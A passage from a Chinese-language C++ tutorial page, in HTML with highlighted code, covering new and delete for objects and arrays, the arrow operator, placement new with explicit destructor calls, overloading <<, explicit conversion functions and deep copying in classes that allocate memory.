class="meta-string">&quot;string1.h&quot;</span> <span class="comment">// 包含 String 类定义</span></span></span><br><span class="line"></span><br><span class="line">String * p_string; <span class="comment">// 声明一个指向 String 对象的指针</span></span><br></pre></td></tr></table></figure><h3 id="12-5-1-再读-new-和-delete"><a href="#12-5-1-再读-new-和-delete" class="headerlink" title="12.5.1 再读 new 和 delete"></a>12.5.1 再读 new 和 delete</h3><p>使用 <code>new</code> 运算符可以在自由存储区（堆）上动态地创建对象，并返回该对象的地址。这个地址可以存储在相应类型的指针中。</p><p><strong>使用 <code>new</code> 创建对象:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pointerName = <span class="keyword">new</span> ClassName; <span class="comment">// 调用默认构造函数</span></span><br><span class="line">pointerName = <span class="keyword">new</span> ClassName(arguments); <span class="comment">// 调用匹配参数的构造函数</span></span><br></pre></td></tr></table></figure><p>当使用 <code>new ClassName(...)</code> 时，会发生两件事：</p><ol><li> 在自由存储区分配足够容纳 <code>ClassName</code> 对象的内存。</li><li> 调用相应的<strong>构造函数</strong>来初始化这块内存中的对象。</li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    String * p1 = <span class="keyword">new</span> String(<span class="string">&quot;Dynamically allocated string&quot;</span>); <span class="comment">// 调用 String(const char*)</span></span><br><span class="line">    String * p2 = <span class="keyword">new</span> String; <span class="comment">// 调用默认构造函数 String()</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1 points to: &quot;</span> &lt;&lt; *p1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 使用 * 解引用指针访问对象</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2 points to: &quot;</span> &lt;&lt; *p2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 使用 p1 和 p2 指向的对象 ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用 <code>delete</code> 销毁对象:</strong></p><p>通过 <code>new</code> 创建的对象必须使用 <code>delete</code> 来销毁，以释放内存并执行清理工作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> pointerName;</span><br></pre></td></tr></table></figure><p>当使用 <code>delete pointerName</code> 时，会发生两件事：</p><ol><li> 调用 <code>pointerName</code> 指向的对象的<strong>析构函数</strong> (<code>~ClassName()</code>)。</li><li> 释放该对象占用的内存。</li></ol><p><strong>示例 (续):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp (续)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ... (创建 p1, p2 的代码) ...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDeleting objects...\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> p1; <span class="comment">// 调用 ~String() for *p1，然后释放内存</span></span><br><span class="line">    <span class="keyword">delete</span> p2; <span class="comment">// 调用 ~String() for *p2，然后释放内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// p1 和 p2 现在是悬挂指针，不应再使用</span></span><br><span class="line">    p1 = <span class="literal">nullptr</span>;</span><br><span class="line">    p2 = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>忘记 <code>delete</code> 通过 <code>new</code> 创建的对象会导致<strong>内存泄漏</strong>。</p><p><strong><code>new[]</code> 和 <code>delete[]</code> 用于对象数组:</strong></p><p>同样可以动态分配对象数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size = <span class="number">5</span>;</span><br><span class="line">String * favorites = <span class="keyword">new</span> String[size]; <span class="comment">// 调用 size 次默认构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 使用数组 ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> [] favorites; <span class="comment">// 调用 size 次析构函数，然后释放整个数组内存</span></span><br></pre></td></tr></table></figure><ul><li>  <code>new ClassName[size]</code> 会为数组中的<strong>每个</strong>元素调用<strong>默认构造函数</strong>。如果类没有默认构造函数，这种分配方式将失败。</li><li>  <strong>必须</strong>使用 <code>delete []</code> 来释放通过 <code>new[]</code> 分配的数组。使用 <code>delete</code> (不带 <code>[]</code>) 会导致未定义行为（通常只调用第一个元素的析构函数，并可能导致内存损坏）。</li></ul><h3 id="12-5-2-指针和对象小结"><a href="#12-5-2-指针和对象小结" class="headerlink" title="12.5.2 指针和对象小结"></a>12.5.2 指针和对象小结</h3><ul><li>  <strong>声明:</strong> <code>ClassName * ptr;</code></li><li>  <strong>动态创建:</strong> <code>ptr = new ClassName(args);</code> (调用构造函数)</li><li>  <strong>动态销毁:</strong> <code>delete ptr;</code> (调用析构函数)</li><li><strong>访问成员:</strong><ul><li>  <strong>解引用和点号:</strong> <code>(*ptr).memberName</code> 或 <code>(*ptr).methodName(args)</code></li><li>  <strong>箭头运算符 (常用):</strong> <code>ptr-&gt;memberName</code> 或 <code>ptr-&gt;methodName(args)</code>。箭头运算符 <code>-&gt;</code> 是专门为指向对象的指针访问其成员而设计的，它等价于先解引用再用点号访问。</li></ul></li></ul><p><strong>示例 (使用箭头运算符):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String * glamour = <span class="keyword">new</span> String(<span class="string">&quot;Glamorous&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用箭头运算符访问成员</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;String: &quot;</span> &lt;&lt; glamour-&gt;<span class="keyword">operator</span> <span class="keyword">const</span> <span class="keyword">char</span> *() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 假设有转换函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; glamour-&gt;length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 调用 length() 方法</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char: &quot;</span> &lt;&lt; (*glamour)[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 混合使用 * 和 []</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char again: &quot;</span> &lt;&lt; glamour-&gt;<span class="keyword">operator</span>[](<span class="number">0</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 使用 -&gt; 调用 operator[]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> glamour;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-5-3-再读定位-new-运算符"><a href="#12-5-3-再读定位-new-运算符" class="headerlink" title="12.5.3 再读定位 new 运算符"></a>12.5.3 再读定位 new 运算符</h3><p>标准 <code>new</code> 在自由存储区（堆）上查找内存块。C++ 还允许通过另一种形式的 <code>new</code>——**定位 <code>new</code> (placement new)**——来指定分配对象的位置。</p><p><strong>前提:</strong> 你需要提供一个指向<strong>已分配好</strong>的内存块的地址，并确保该内存块足够大以容纳要创建的对象。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;new&gt; // 必须包含 &lt;new&gt; 头文件</span></span></span><br><span class="line"></span><br><span class="line">BufferType * buffer = <span class="comment">/* ... 获取指向已分配内存的指针 ... */</span>;</span><br><span class="line">ClassName * ptr;</span><br><span class="line"></span><br><span class="line">ptr = <span class="keyword">new</span> (buffer) ClassName(arguments); <span class="comment">// 在 buffer 指向的内存上构造对象</span></span><br></pre></td></tr></table></figure><ul><li>  <code>new (buffer)</code>: 这部分是定位 <code>new</code> 运算符。它不分配新内存，而是告诉编译器在 <code>buffer</code> 指向的地址处构造对象。</li><li>  <code>ClassName(arguments)</code>: 调用相应的构造函数来初始化 <code>buffer</code> 指向的内存区域。</li></ul><p><strong>何时使用定位 <code>new</code>?</strong></p><ol><li> <strong>内存池管理:</strong> 当你需要自己管理一块大的内存区域（内存池），并在其中反复创建和销毁对象时，可以避免频繁调用标准 <code>new</code> 和 <code>delete</code> 带来的开销和内存碎片。</li><li> <strong>特定硬件地址:</strong> 在某些嵌入式系统或底层编程中，可能需要在特定的硬件地址上创建对象。</li><li> <strong>优化:</strong> 在性能要求极高的场景下，如果能预先分配好内存，定位 <code>new</code> 可以省去标准 <code>new</code> 的内存查找开销。</li></ol><p><strong>销毁定位 <code>new</code> 创建的对象:</strong></p><p>定位 <code>new</code> 只负责调用构造函数，它<strong>不</strong>负责内存管理。因此，你<strong>不能</strong>对通过定位 <code>new</code> 获取的指针使用标准的 <code>delete</code>。标准的 <code>delete</code> 会尝试释放内存，但这块内存不是由标准 <code>new</code> 分配的（或者你打算重用它）。</p><p>要销毁通过定位 <code>new</code> 创建的对象，你需要<strong>显式地调用该对象的析构函数</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptr-&gt;~ClassName(); <span class="comment">// 显式调用析构函数</span></span><br></pre></td></tr></table></figure><ul><li>  <code>ptr-&gt;~ClassName()</code>: 这是调用析构函数的语法。它执行对象的清理工作，但<strong>不释放内存</strong>。</li><li>  内存的释放由管理 <code>buffer</code> 的代码负责（例如，如果 <code>buffer</code> 是一个大的 <code>char</code> 数组，它会在数组生命周期结束时自动释放；如果是通过标准 <code>new</code> 分配的，则需要对应的 <code>delete []</code>）。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;new&gt;      // for placement new</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span> <span class="comment">// 假设 String 类有默认和 C-string 构造函数及析构函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BUF = <span class="number">512</span>;</span><br><span class="line"><span class="keyword">char</span> buffer[BUF]; <span class="comment">// 预先分配的内存缓冲区 (静态存储)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    String *p1, *p2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Block 1: placement new in buffer:\n&quot;</span>;</span><br><span class="line">    p1 = <span class="keyword">new</span> (buffer) String(<span class="string">&quot;Hello&quot;</span>); <span class="comment">// 在 buffer 开始处构造 String(&quot;Hello&quot;)</span></span><br><span class="line">    <span class="comment">// 计算 buffer 中下一个可用地址</span></span><br><span class="line">    <span class="comment">// 注意：这只是一个简化示例，实际内存池管理需要更复杂的对齐和大小计算</span></span><br><span class="line">    <span class="keyword">size_t</span> available_space = BUF - <span class="keyword">sizeof</span>(String);</span><br><span class="line">    <span class="keyword">void</span> * next_loc = buffer + <span class="keyword">sizeof</span>(String);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (available_space &gt;= <span class="keyword">sizeof</span>(String)) &#123;</span><br><span class="line">         p2 = <span class="keyword">new</span> (next_loc) String(<span class="string">&quot;World&quot;</span>); <span class="comment">// 在 buffer 的下一个位置构造 String(&quot;World&quot;)</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Not enough space for p2.\n&quot;</span>;</span><br><span class="line">         p2 = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Memory addresses:\n&quot;</span> &lt;&lt; <span class="string">&quot;buffer: &quot;</span> &lt;&lt; (<span class="keyword">void</span> *) buffer</span><br><span class="line">         &lt;&lt; <span class="string">&quot;  p1: &quot;</span> &lt;&lt; p1 &lt;&lt; <span class="string">&quot;  p2: &quot;</span> &lt;&lt; p2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1: &quot;</span> &lt;&lt; *p1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (p2) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2: &quot;</span> &lt;&lt; *p2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显式销毁对象 (按构造相反顺序通常是好习惯)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDestroying objects:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (p2) &#123;</span><br><span class="line">        p2-&gt;~String(); <span class="comment">// 调用 p2 指向对象的析构函数</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2 destroyed.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p1-&gt;~String();     <span class="comment">// 调用 p1 指向对象的析构函数</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1 destroyed.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// buffer 内存本身会在 main 结束时自动释放 (因为它是栈上的数组)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nBlock 2: Standard new/delete:\n&quot;</span>;</span><br><span class="line">    String * p3 = <span class="keyword">new</span> String(<span class="string">&quot;Standard new&quot;</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p3: &quot;</span> &lt;&lt; *p3 &lt;&lt; <span class="string">&quot; at &quot;</span> &lt;&lt; p3 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">delete</span> p3; <span class="comment">// 使用标准 delete，它会调用析构函数并释放内存</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p3 deleted.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong></p><ul><li>  指向对象的指针是管理动态创建对象的常用方式。</li><li>  <code>new ClassName(args)</code> 分配内存并调用构造函数。</li><li>  <code>delete ptr</code> 调用析构函数并释放内存。</li><li>  <code>new ClassName[size]</code> 分配数组并调用默认构造函数。</li><li>  <code>delete [] ptr</code> 调用数组元素的析构函数并释放内存。</li><li>  使用 <code>-&gt;</code> 运算符通过指针访问对象成员。</li><li>  定位 <code>new</code> (<code>new (address) ClassName(args)</code>) 在指定地址构造对象，不分配内存。</li><li>  定位 <code>new</code> 创建的对象必须通过显式调用析构函数 (<code>ptr-&gt;~ClassName()</code>) 来销毁，内存需另外管理。</li></ul><h2 id="12-6-复习各种技术"><a href="#12-6-复习各种技术" class="headerlink" title="12.6 复习各种技术"></a>12.6 复习各种技术</h2><p>本章我们深入探讨了类如何与动态内存分配交互，以及为了正确管理资源和避免错误所必须采用的技术。本节将简要回顾其中几个关键技术点。</p><h3 id="12-6-1-重载-lt-lt-运算符"><a href="#12-6-1-重载-lt-lt-运算符" class="headerlink" title="12.6.1 重载 &lt;&lt; 运算符"></a>12.6.1 重载 <code>&lt;&lt;</code> 运算符</h3><p>为了方便地输出对象的状态，我们经常为自定义类重载输出运算符 <code>&lt;&lt;</code>。</p><ul><li><strong>实现方式:</strong> 通常实现为<strong>非成员友元函数</strong>。<ul><li>  <strong>非成员:</strong> 因为左操作数是 <code>std::ostream</code> 对象（如 <code>cout</code>），而不是我们自定义类的对象。调用形式是 <code>operator&lt;&lt;(cout, myObject)</code>。</li><li>  <strong>友元:</strong> 因为它通常需要访问类的 <code>private</code> 数据成员来获取要输出的信息。</li></ul></li><li><strong>函数签名:</strong> <code>friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const ClassName &amp; obj);</code><ul><li>  第一个参数是 <code>ostream</code> 对象的引用。</li><li>  第二个参数通常是待输出对象的 <code>const</code> 引用（因为输出操作不应修改对象）。</li><li>  返回 <code>ostream</code> 对象的引用，以支持链式输出（<code>cout &lt;&lt; obj1 &lt;&lt; obj2;</code>）。</li></ul></li><li>  <strong>实现:</strong> 函数内部访问对象的成员，并将它们格式化输出到传入的 <code>ostream</code> 对象 <code>os</code> 中。</li></ul><p><strong>示例 (回顾 <code>String</code> 类):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private: char * str; int len; ...</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> String &amp; st);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> String &amp; st) &#123;</span><br><span class="line">    os &lt;&lt; st.str; <span class="comment">// 友元函数访问私有成员 str</span></span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="function">String <span class="title">greeting</span><span class="params">(<span class="string">&quot;Hello&quot;</span>)</span></span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Message: &quot;</span> &lt;&lt; greeting &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 调用 operator&lt;&lt;(cout, greeting)</span></span><br></pre></td></tr></table></figure><h3 id="12-6-2-转换函数"><a href="#12-6-2-转换函数" class="headerlink" title="12.6.2 转换函数"></a>12.6.2 转换函数</h3><p>转换函数允许类对象被隐式或显式地转换为其他类型。</p><ul><li><strong>语法:</strong> <code>operator typeName() const;</code><ul><li>  必须是<strong>成员函数</strong>。</li><li>  <strong>没有</strong>声明返回类型。</li><li>  通常<strong>没有</strong>参数。</li><li>  通常声明为 <code>const</code>，因为转换操作不应修改对象状态。</li></ul></li><li>  <strong>功能:</strong> 定义了从当前类类型到 <code>typeName</code> 类型的转换规则。</li><li>  <strong><code>explicit</code> (C++11):</strong> 可以使用 <code>explicit</code> 关键字阻止隐式转换，只允许显式转换（如 <code>static_cast</code>）。这有助于避免意外转换和二义性。</li></ul><p><strong>示例 (回顾 <code>Stones</code> 类):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private: double pounds; ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 显式转换为 double</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span></span>;    <span class="comment">// 显式转换为 int</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// stones.cpp excerpt</span></span><br><span class="line"><span class="function">Stones::<span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pounds;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Stones::<span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(pounds + <span class="number">0.5</span>); <span class="comment">// 四舍五入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="function">Stones <span class="title">stone_obj</span><span class="params">(<span class="number">100.7</span>)</span></span>;</span><br><span class="line"><span class="comment">// double weight = stone_obj; // 错误！因为是 explicit</span></span><br><span class="line"><span class="keyword">double</span> weight = <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(stone_obj); <span class="comment">// OK: 显式转换</span></span><br><span class="line"><span class="keyword">int</span> int_weight = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(stone_obj);    <span class="comment">// OK: 显式转换</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><p><strong>注意事项:</strong></p><ul><li>  谨慎使用隐式转换函数，它们可能导致代码行为难以预测或产生二义性。优先使用 <code>explicit</code>。</li><li>  避免提供相互冲突或模糊的转换路径。</li></ul><h3 id="12-6-3-其构造函数使用-new-的类"><a href="#12-6-3-其构造函数使用-new-的类" class="headerlink" title="12.6.3 其构造函数使用 new 的类"></a>12.6.3 其构造函数使用 <code>new</code> 的类</h3><p>这是本章的核心内容。当类的构造函数使用 <code>new</code> 来分配动态内存，并且类负责管理这块内存（即在析构函数中使用 <code>delete</code>）时，必须特别注意对象的复制和赋值行为。</p><p><strong>问题:</strong> 编译器生成的默认复制构造函数和默认赋值运算符执行<strong>浅复制</strong>（只复制指针地址），导致：</p><ul><li>  多个对象指向同一块内存。</li><li>  析构时发生**重复删除 (double deletion)**。</li><li>  赋值时可能发生<strong>内存泄漏</strong>（旧内存未释放）。</li></ul><p><strong>解决方案 (三/五法则):</strong><br>必须提供自定义的特殊成员函数来执行<strong>深复制</strong>并正确管理内存：</p><ol><li><p><strong>析构函数 (<code>~ClassName()</code>):</strong></p><ul><li>  <strong>必须</strong>定义。</li><li>  负责使用 <code>delete</code> 或 <code>delete[]</code> 释放构造函数中通过 <code>new</code> 分配的所有内存。</li></ul></li><li><p><strong>复制构造函数 (<code>ClassName(const ClassName &amp;)</code>):</strong></p><ul><li>  <strong>必须</strong>定义。</li><li>  为新对象分配<strong>自己的</strong>内存。</li><li>  将源对象的数据<strong>复制</strong>到新分配的内存中。</li></ul></li><li><p><strong>复制赋值运算符 (<code>ClassName &amp; operator=(const ClassName &amp;)</code>):</strong></p><ul><li>  <strong>必须</strong>定义。</li><li>  <strong>检查自我赋值</strong> (<code>if (this == &amp;other) return *this;</code>)。</li><li>  <strong>释放当前对象 (<code>*this</code>) 的旧内存</strong>。</li><li>  为当前对象分配<strong>新的</strong>内存。</li><li>  将源对象的数据<strong>复制</strong>到新分配的内存中。</li><li>  返回对当前对象 (<code>*this</code>) 的引用。</li></ul></li></ol><p><strong>示例 (回顾 <code>String</code> 类关键部分):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> * str;</span><br><span class="line">   